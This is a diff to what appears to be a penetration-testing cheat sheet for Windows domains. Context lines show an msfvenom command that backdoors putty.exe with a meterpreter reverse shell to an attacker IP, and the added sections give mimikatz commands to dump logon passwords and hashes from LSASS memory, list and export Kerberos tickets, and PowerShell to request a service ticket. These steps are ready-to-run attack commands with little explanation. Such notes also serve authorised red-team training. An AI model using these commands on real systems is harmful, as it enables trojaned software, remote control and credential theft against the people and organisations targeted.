@@ -222,5 +222,35 @@ Backdoor .exe files.
 
 `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`  
 
-  
+ ## Logged on users hashes from LSASS memory.  
+ 
+ ```
+ mimikatz.exe
+ privilege::debug
+ sekurlsa::logonpasswords
+ ```  
+ 
+ ## Cached credentials  
+ 
+ Show tickets stored in memory.  
+ 
+ `sekurlsa::tickets`  
+ 
+ ## Service tickets  
+ 
+ Requesting a service ticket.  
+ 
+ ```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/theServer.evilcorp.com'
+ ```  
+List all tickets for current logged in user.  
+ 
+ `klist`  
+ 
+Save ticket to disk.  
 
+`kerberos::list /export`  
+
+
+ 
